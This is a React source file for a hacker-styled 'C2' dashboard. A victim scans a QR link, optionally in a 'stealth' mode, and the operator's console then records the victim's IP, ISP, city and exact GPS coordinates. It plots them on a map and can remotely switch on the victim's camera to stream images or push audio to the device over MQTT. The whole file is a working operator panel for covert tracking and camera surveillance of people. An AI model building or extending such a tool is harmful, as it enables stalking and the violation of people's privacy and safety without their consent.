
import React, { useEffect, useState, useCallback, useRef } from 'react';
import { v4 as uuidv4 } from 'uuid';
import Terminal from '../components/Terminal';
import QRCodeDisplay from '../components/QRCodeDisplay';
import HackerMap from '../components/HackerMap';
import { mqttService } from '../services/mqttService';
import { TerminalLog, DeviceInfo, StreamMessage } from '../types';
import { Camera, X, Disc, Video, Aperture, Ghost, EyeOff, Eye } from 'lucide-react';

const Dashboard: React.FC = () => {
  const [sessionId] = useState(uuidv4());
  const [logs, setLogs] = useState<TerminalLog[]>([]);
  const [connected, setConnected] = useState(false);
  const [targetUrl, setTargetUrl] = useState('');
  const [targetCoords, setTargetCoords] = useState<{lat: number, lng: number} | null>(null);
  const [isStealth, setIsStealth] = useState(false);
  
  // Camera Surveillance State
  const [showCameraModal, setShowCameraModal] = useState(false);
  const [cameraStream, setCameraStream] = useState<string | null>(null);
  const [isCameraActive, setIsCameraActive] = useState(false);
  
  const audioCtxRef = useRef<AudioContext | null>(null);

  const playSound = useCallback((type: 'connect' | 'data' | 'boot' | 'alert') => {
    if (!audioCtxRef.current) {
      audioCtxRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
    }
    const ctx = audioCtxRef.current;
    if (!ctx || ctx.state === 'suspended') return;

    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    const now = ctx.currentTime;

    if (type === 'boot') {
      osc.type = 'square';
      osc.frequency.setValueAtTime(100, now);
      osc.frequency.exponentialRampToValueAtTime(800, now + 0.1);
      gain.gain.setValueAtTime(0.1, now);
      gain.gain.exponentialRampToValueAtTime(0.01, now + 0.3);
      osc.start(now);
      osc.stop(now + 0.3);
    } else if (type === 'connect') {
      osc.type = 'sawtooth';
      osc.frequency.setValueAtTime(440, now);
      osc.frequency.setValueAtTime(880, now + 0.1);
      gain.gain.setValueAtTime(0.1, now);
      gain.gain.linearRampToValueAtTime(0, now + 0.5);
      osc.start(now);
      osc.stop(now + 0.5);
    } else if (type === 'data') {
      osc.type = 'sine';
      osc.frequency.setValueAtTime(1200, now);
      osc.frequency.exponentialRampToValueAtTime(600, now + 0.1);
      gain.gain.setValueAtTime(0.05, now);
      gain.gain.linearRampToValueAtTime(0, now + 0.1);
      osc.start(now);
      osc.stop(now + 0.1);
    }
  }, []);

  const addLog = useCallback((message: string, type: TerminalLog['type'] = 'info', link?: string) => {
    setLogs(prev => [...prev, {
      id: uuidv4(),
      message,
      type,
      timestamp: new Date().toISOString(),
      link
    }]);
    if (type === 'success' || type === 'warning') playSound('data');
  }, [playSound]);

  const toggleCamera = () => {
    if (!connected) {
      addLog('ERROR: NO TARGET CONNECTED', 'error');
      return;
    }
    if (!isCameraActive) {
      addLog('INITIATING_REMOTE_SURVEILLANCE...', 'warning');
      mqttService.publishCommand(sessionId, { type: 'ACTIVATE_CAMERA', timestamp: new Date().toISOString() });
      setShowCameraModal(true);
      setIsCameraActive(true);
    } else {
      addLog('TERMINATING_FEED', 'system');
      mqttService.publishCommand(sessionId, { type: 'STOP_CAMERA', timestamp: new Date().toISOString() });
      setShowCameraModal(false);
      setIsCameraActive(false);
      setCameraStream(null);
    }
  };

  const sendAura = () => {
    if (!connected) return;
    addLog('INJECTING_AUDIO_PAYLOAD: AURA', 'warning');
    mqttService.publishCommand(sessionId, { 
      type: 'PLAY_AUDIO', 
      timestamp: new Date().toISOString(),
      payload: { url: 'https://www.myinstants.com/media/sounds/auraa.mp3' }
    });
  };

  useEffect(() => {
    const baseUrl = window.location.href.split('#')[0];
    const scanUrl = `${baseUrl}#/scan?session=${sessionId}${isStealth ? '&stealth=true' : ''}`;
    setTargetUrl(scanUrl);
  }, [sessionId, isStealth]);

  useEffect(() => {
    playSound('boot');
    addLog(`PEGASUS_SYSTEM_ONLINE`, 'system');
    addLog(`C2_SESSION: ${sessionId.substring(0,8)}`, 'info');

    mqttService.connect(
      sessionId,
      (payload: DeviceInfo) => {
        playSound('connect');
        addLog(`!!! INTRUSION ALERT !!!`, 'warning');
        if (payload.isStealth) addLog(`[STEALTH_MODE_ACTIVE]`, 'system');
        
        addLog(`TARGET_CONNECTED: ${payload.ip}`, 'success');
        
        if (payload.ipGeo) {
           addLog(`ISP: ${payload.ipGeo.isp}`, 'info');
           addLog(`LOCATION_ESTIMATE: ${payload.ipGeo.city}, ${payload.ipGeo.country}`, 'info');
        }

        if (payload.coords) {
           addLog(`TRIANGULATION: SUCCESS`, 'success');
           const mapsUrl = `https://www.google.com/maps?q=${payload.coords.latitude},${payload.coords.longitude}`;
           addLog(`MAP_LINK_GENERATED`, 'system', mapsUrl);
           setTargetCoords({ lat: payload.coords.latitude, lng: payload.coords.longitude });
        }
      },
      () => {
        setConnected(true);
        addLog(`AWAITING_TARGET_UPLINK...`, 'success');
      },
      undefined, 
      (streamData: StreamMessage) => {
        setCameraStream(streamData.image);
      }
    );

    return () => mqttService.disconnect();
  }, [sessionId, addLog, playSound]);

  return (
    <div className="flex flex-col md:flex-row h-screen w-screen overflow-hidden bg-black" onClick={() => audioCtxRef.current?.resume()}>
      <div className="w-full md:w-1/2 h-1/2 md:h-full relative z-20 flex flex-col">
        <Terminal logs={logs} connected={connected} sessionId={sessionId} />
        
        <div className="bg-gray-900 border-t border-gray-800 p-2 flex flex-wrap justify-between items-center gap-2">
           <div className="flex items-center gap-2 bg-black/40 px-3 py-1.5 border border-gray-800 rounded">
             <span className={`text-[10px] font-bold tracking-tighter ${isStealth ? 'text-blue-500' : 'text-gray-500'}`}>MODO:</span>
             <button 
                onClick={() => setIsStealth(!isStealth)}
                className={`flex items-center gap-2 px-3 py-1 text-[10px] font-mono font-bold uppercase border transition-all ${
                  isStealth 
                    ? 'bg-blue-900/30 border-blue-500 text-blue-400' 
                    : 'bg-gray-800 border-gray-600 text-gray-400'
                }`}
             >
               {isStealth ? <EyeOff size={12} /> : <Eye size={12} />}
               {isStealth ? 'STEALTH_ON' : 'STEALTH_OFF'}
             </button>
           </div>

           <div className="flex gap-2">
             <button onClick={sendAura} disabled={!connected} className="flex items-center gap-2 px-4 py-2 text-xs font-mono font-bold uppercase tracking-wider border bg-purple-900/20 border-purple-600 text-purple-400 disabled:opacity-30">
               <Ghost size={14} /> AURA
             </button>
             <button onClick={toggleCamera} disabled={!connected} className={`flex items-center gap-2 px-4 py-2 text-xs font-mono font-bold uppercase tracking-wider border transition-all ${isCameraActive ? 'bg-red-900/50 border-red-500 text-red-500 animate-pulse' : 'bg-gray-800 border-gray-600 text-gray-300 disabled:opacity-30'}`}>
               <Camera size={14} /> CAM
             </button>
           </div>
        </div>
      </div>

      <div className="w-full md:w-1/2 h-1/2 md:h-full relative z-10 border-l border-gray-800">
        {targetCoords ? <HackerMap lat={targetCoords.lat} lng={targetCoords.lng} /> : <QRCodeDisplay url={targetUrl} />}
      </div>

      {showCameraModal && (
        <div className="fixed inset-0 z-50 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-black border border-red-900 w-full max-w-2xl shadow-2xl flex flex-col">
            <div className="bg-red-900/20 border-b border-red-900/50 p-2 flex justify-between items-center text-red-500 font-mono text-xs uppercase">
              <div className="flex items-center gap-2">
                 <Disc size={12} className="animate-pulse text-red-600" />
                 <span>LIVE_FEED :: {sessionId.substring(0,8)}</span>
              </div>
              <button onClick={toggleCamera} className="hover:text-white"><X size={16} /></button>
            </div>
            <div className="relative aspect-video bg-black flex items-center justify-center overflow-hidden">
              {cameraStream ? <img src={cameraStream} className="w-full h-full object-cover" alt="Feed" /> : <div className="text-red-500 animate-pulse flex flex-col items-center gap-2"><Video size={32} /><span>WAITING_FEED...</span></div>}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
